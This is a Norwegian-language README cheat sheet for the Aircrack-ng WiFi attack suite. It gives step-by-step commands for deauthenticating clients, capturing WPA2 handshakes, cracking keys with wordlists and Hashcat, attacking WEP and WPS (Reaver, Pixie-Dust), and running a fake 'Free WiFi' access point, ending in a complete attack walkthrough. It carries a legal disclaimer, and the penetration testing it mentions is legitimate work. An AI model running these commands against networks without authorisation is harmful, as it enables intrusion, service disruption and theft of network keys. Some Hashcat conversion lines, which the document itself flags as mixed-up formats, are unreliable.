# 📶 Aircrack-ng – hurtigguide til en verktøysamling for WiFi-testing

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    Verktøysamling for WiFi-testing
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

> **Merknad til originalen:** Støtte for monitormodus og injisering avhenger av maskinvarerevisjon, brikkesett og driver; modellnavnet alene garanterer ikke kompatibilitet ([Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=compatible_cards)). WPA-eksemplene gjelder forhåndsdelte nøkler (PSK), ikke all WPA/WPA2-autentisering. Originalen blander Hashcat-formater: Aircrack-ng dokumenterer `-j` for HCCAPX og `-J` for eldre HCCAP; modus `22000` forventer et eget tekstformat, ikke `.hccapx` ([Aircrack-ng-valg](https://www.aircrack-ng.org/doku.php?id=aircrack-ng), [Hashcat-format](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)). Eksemplene er bevart uendret.

---

## 📋 Innhold

- [Hva er Aircrack-ng](#-hva-er-aircrack-ng)
- [Installasjon](#-installasjon)
- [Monitormodus](#-monitormodus)
- [Kartlegging (airodump-ng)](#-kartlegging-airodump-ng)
- [Deautentisering (aireplay-ng)](#-deautentisering-aireplay-ng)
- [Knekking av WPA/WPA2-nøkler](#-knekking-av-wpawpa2-nøkler)
- [Knekking av WEP-nøkler](#-knekking-av-wep-nøkler)
- [WPS-angrep](#-wps-angrep)
- [Flere verktøy](#-flere-verktøy)
- [Fullstendig angrepsforløp](#-fullstendig-angrepsforløp)
- [Hurtigreferanse](#-hurtigreferanse)

---

## 🎯 Hva er Aircrack-ng

**Aircrack-ng** er en komplett verktøysamling for vurdering av sikkerheten i WiFi-nettverk. Den inneholder:

- 📡 **airodump-ng** – pakkefangst og oppdagelse av nettverk
- 💥 **aireplay-ng** – pakkeinjisering og deautentiseringsangrep (deauth)
- 🔓 **aircrack-ng** – knekking av WEP- og WPA/WPA2-nøkler
- 🔧 **airmon-ng** – aktivering og deaktivering av monitormodus (monitor mode), som lar adapteren observere WiFi-rammer
- 📝 **airodecap-ng** – dekryptering av innsamlet trafikk

### Forutsetninger

| Forutsetning | Beskrivelse |
| ------------- | ------------- |
| **Trådløsadapter** | Må støtte monitormodus og pakkeinjisering |
| **Støttede brikkesett** | Atheros, Ralink og enkelte Realtek-brikkesett |
| **Operativsystem** | Linux anbefales (Kali) |

### Populære kompatible adaptere

| Adapter | Brikkesett | Merknader |
| --------- | --------- | ------- |
| Alfa AWUS036ACH | RTL8812AU | Kraftig, med støtte for to frekvensbånd |
| Alfa AWUS036NHA | Atheros AR9271 | Klassisk og pålitelig |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Rimelig alternativ |

---

## 🚀 Installasjon

### Kali Linux (forhåndsinstallert)

```bash
# Allerede installert; kontroller versjonen
aircrack-ng --version

# Oppdater
sudo apt update && sudo apt install aircrack-ng
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

### Fra kildekoden

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

## 📡 Monitormodus

### Kontroller det trådløse grensesnittet

```bash
# Vis trådløse grensesnitt
iwconfig

# Eller
iw dev

# Eller
airmon-ng
```

### Aktiver monitormodus

```bash
# Metode 1: airmon-ng (anbefalt)
sudo airmon-ng start wlan0

# Utdata: Monitor mode enabled on wlan0mon

# Metode 2: Manuelt
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Avslutt forstyrrende prosesser

```bash
# Avslutt prosesser som kan forstyrre
sudo airmon-ng check kill

# Eller manuelt
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

### Deaktiver monitormodus

```bash
# Deaktiver monitormodus
sudo airmon-ng stop wlan0mon

# Start NetworkManager på nytt
sudo systemctl start NetworkManager
```

### Bytt kanal

```bash
# Angi en bestemt kanal
sudo iwconfig wlan0mon channel 6

# Eller med airmon-ng
sudo airmon-ng start wlan0 6
```

---

## 🔍 Kartlegging (airodump-ng)

### Grunnleggende skanning

```bash
# Skann alle nettverk
sudo airodump-ng wlan0mon

# Utdata:
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

### Skann et bestemt frekvensbånd

```bash
# Bare 2,4 GHz
sudo airodump-ng --band g wlan0mon

# Bare 5 GHz
sudo airodump-ng --band a wlan0mon

# Begge bånd
sudo airodump-ng --band abg wlan0mon
```

### Velg et bestemt nettverk

```bash
# Filtrer etter kanal og BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Skriv pakkefangsten til en fil
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Oppretter: capture-01.cap, capture-01.csv osv.
```

### Forstå utdataene

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| Felt | Beskrivelse |
| ------- | ------------- |
| BSSID | Tilgangspunktets (AP) MAC-adresse |
| PWR | Signalstyrke (nærmere 0 betyr sterkere signal) |
| Beacons | Antall beacon-rammer (kunngjøringsrammer) |
| #Data | Antall datapakker |
| CH | Kanal |
| ENC | Kryptering (WPA2/WPA/WEP/OPN) |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | Nettverksnavn |
| STATION | MAC-adressen til en tilkoblet klient |

### Filtreringsvalg

```bash
# Vis bare krypterte nettverk
sudo airodump-ng --encrypt wpa2 wlan0mon

# Vis bare WEP
sudo airodump-ng --encrypt wep wlan0mon

# Bestemt ESSID
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

## 💥 Deautentisering (aireplay-ng)

### Hvorfor deautentisere?

Deautentisering tvinger klientene til å koble til på nytt, slik at fireveishåndtrykket (4-way handshake) som brukes ved knekking av WPA/WPA2-nøkler, kan fanges opp.

### Deautentiser én klient

```bash
# Deautentiser en bestemt klient
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Deautentiseringsangrep
# 5  : Antall deautentiseringer (0 = uendelig)
# -a : Tilgangspunktets BSSID
# -c : Klientens MAC-adresse
```

### Deautentiser alle klienter

```bash
# Kringkast deautentisering (alle klienter)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Mer aggressivt
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Se etter håndtrykk

```
# Se etter følgende i airodump-ng:
WPA handshake: AA:BB:CC:DD:EE:FF

# Dette vises øverst til høyre
```

---

## 🔓 Knekking av WPA/WPA2-nøkler

### Fullstendig WPA2-angrepsforløp

```bash
# Trinn 1: Aktiver monitormodus
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Trinn 2: Søk etter nettverk
sudo airodump-ng wlan0mon

# Trinn 3: Velg et bestemt nettverk (pakkefangst)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Trinn 4: Deautentiser klienten (ny terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Trinn 5: Vent på håndtrykket (vises i airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Trinn 6: Knekk nøkkelen med en ordliste
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Ordlisteangrep

```bash
# Grunnleggende ordlisteangrep
aircrack-ng -w wordlist.txt capture-01.cap

# Bruk rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Flere ordlister
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

### Angi målets ESSID

```bash
# Hvis pakkefangsten inneholder flere nettverk
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# Eller etter BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Bruk av Hashcat (raskere med GPU)

```bash
# Konverter cap til Hashcat-format
aircrack-ng capture-01.cap -J hashcat_file
# Oppretter: hashcat_file.hccapx

# Eller bruk cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# Knekk nøkkelen med Hashcat
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 for eldre hccap-format
```

### Konverter formater

```bash
# CAP til HCCAPX (Hashcat)
aircrack-ng capture-01.cap -j hashcat_output

# CAP til PCAP
editcap capture-01.cap output.pcap

# Slå sammen flere cap-filer
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

## 🔐 Knekking av WEP-nøkler

> ⚠️ WEP er foreldet og usikkert. De fleste nettverk bruker nå WPA2/WPA3.

### Typer WEP-angrep

| Angrep | Beskrivelse |
| -------- | ------------- |
| ARP Replay | Fang opp og send ARP-pakker på nytt |
| Falsk autentisering | Knytt til tilgangspunktet uten nøkkel |
| Fragmentering | Generer nøkkelstrøm |
| ChopChop | Dekrypter pakker uten nøkkel |

### Grunnleggende WEP-angrep

```bash
# Trinn 1: Fang opp trafikk
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Trinn 2: Falsk autentisering
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Trinn 3: Gjenavspillingsangrep med ARP
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Trinn 4: Knekk nøkkelen når nok initialiseringsvektorer, IV-er, er samlet (>50,000)
sudo aircrack-ng wep_capture-01.cap
```

### Angrepsmoduser i aireplay-ng

| Modus | Beskrivelse |
| ------ | ------------- |
| `-0` | Deautentisering |
| `-1` | Falsk autentisering |
| `-2` | Interaktiv gjenavspilling av pakker |
| `-3` | Gjenavspilling av ARP-forespørsler |
| `-4` | KoreK chopchop-angrep |
| `-5` | Fragmenteringsangrep |
| `-9` | Injiseringstest |

---

## 🔓 WPS-angrep

### Bruk av Reaver

```bash
# Installer Reaver
sudo apt install reaver

# Grunnleggende WPS-angrep
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Med kanal
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Pixie-Dust-angrep (raskere)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

### Bruk av Bully

```bash
# Installer Bully
sudo apt install bully

# Grunnleggende angrep
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### Wash (finn tilgangspunkter med WPS aktivert)

```bash
# Søk etter WPS-nettverk
sudo wash -i wlan0mon

# Utdataene viser:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

## 🔧 Flere verktøy

### airbase-ng (falskt tilgangspunkt)

```bash
# Opprett et falskt tilgangspunkt
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# Med en bestemt BSSID
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### airdecap-ng (dekrypter pakkefangster)

```bash
# Dekrypter en WPA-pakkefangst med en kjent nøkkel
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Dekrypter en WEP-pakkefangst
airdecap-ng -w <wep_key> capture-01.cap
```

### Valg for aircrack-ng

```bash
# Vis alle valg
aircrack-ng --help

# Bruk flere CPU-kjerner
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Stille modus
aircrack-ng -q -w wordlist.txt capture-01.cap

# Angi ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

### packetforge-ng (opprett pakker)

```bash
# Opprett en ARP-pakke
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

## 🎯 Fullstendig angrepsforløp

### WPA2-angrep trinn for trinn

```bash
# Terminal 1: Forberedelser
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Kontroller monitormodus
iwconfig  # Skal vise wlan0mon

# Terminal 1: Skann nettverk
sudo airodump-ng wlan0mon
# Noter målets BSSID, CH og ESSID

# Terminal 1: Velg mål og fang opp trafikk
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# Terminal 2: Deautentiseringsangrep
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# Vent på "WPA handshake: XX:XX:XX:XX:XX:XX" i terminal 1
# Trykk Ctrl+C for å stoppe pakkefangsten

# Terminal 1: Knekk nøkkelen fra håndtrykket
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Eller med Hashcat (GPU – raskere)
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

### Opprydding etter angrepet

```bash
# Deaktiver monitormodus
sudo airmon-ng stop wlan0mon

# Start NetworkManager på nytt
sudo systemctl start NetworkManager

# Rydd opp i filer (valgfritt)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

## 📊 Hurtigreferanse

### Viktige kommandoer

| Formål | Kommando |
| --------- | --------- |
| Aktiver monitormodus | `airmon-ng start wlan0` |
| Deaktiver monitormodus | `airmon-ng stop wlan0mon` |
| Avslutt forstyrrende prosesser | `airmon-ng check kill` |
| Skann nettverk | `airodump-ng wlan0mon` |
| Velg målnettverk | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Deautentisering | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| Knekk WPA-nøkkel | `aircrack-ng -w wordlist.txt capture.cap` |

### Angrepsoversikt

| Angrep | Kryptering | Metode |
| -------- | ------------ | -------- |
| Ordliste | WPA/WPA2 | Fang opp håndtrykk → Knekk nøkkelen med en ordliste |
| Reaver | WPS | Uttømmende utprøving av WPS-PIN |
| Pixie-Dust | WPS | Frakoblet WPS-angrep |
| ARP Replay | WEP | Samle IV-er → Knekk nøkkelen |

### Nyttige ordlister

| Sti | Beskrivelse |
| ------ | ------------- |
| `/usr/share/wordlists/rockyou.txt` | Mest brukt (Kali) |
| `/usr/share/wordlists/fasttrack.txt` | Rask kontroll |
| `/usr/share/seclists/Passwords/` | SecLists-samlingen |

### Feilsøking

```bash
# Grensesnittet går ikke over i monitormodus
sudo rfkill unblock wifi
sudo rfkill unblock all

# Kontroller om driveren støtter injisering
sudo aireplay-ng -9 wlan0mon

# Ingen håndtrykk fanget opp
# - Flytt nærmere målet
# - Prøv andre klienter
# - Deautentiser mer aggressivt
# - Vent lenger

# Airmon viser "Found X processes"
sudo airmon-ng check kill
```

---

## ⚠️ Juridisk ansvarsfraskrivelse

```
⚠️ ADVARSEL: Bruk bare disse verktøyene på nettverk du EIER eller har
UTTRYKKELIG SKRIFTLIG TILLATELSE til å teste. Uautorisert tilgang til
datanettverk er ULOVLIG i de fleste jurisdiksjoner.

Bruk dem ansvarlig til:
✅ Sikkerhetsrevisjon
✅ Penetrasjonstesting (med tillatelse)
✅ Opplæring (i et laboratoriemiljø)

Bruk dem aldri til:
❌ Uautorisert nettverkstilgang
❌ Tyveri av påloggingsopplysninger
❌ Ondsinnede formål
```

---

## 📚 Ressurser

- [Offisielt nettsted for Aircrack-ng](https://www.aircrack-ng.org/)
- [Aircrack-ngs wiki](https://www.aircrack-ng.org/doku.php)
- [Hashcat og WiFi](https://hashcat.net/wiki/)

### Relaterte hurtigguider
- [Hashcat](../../Hashcat/translations/README.nb.md)
- [Wireshark](../../Wireshark/translations/README.nb.md)
- [Linux-kommandoer](../../Linux-Commands/translations/README.nb.md)

---

<p align="center">
  <b>📶 Bli god på sikkerhetstesting av WiFi!</b><br>
  <i>Aircrack-ng – en god hjelper for WiFi-penetrasjonstesteren</i>
</p>
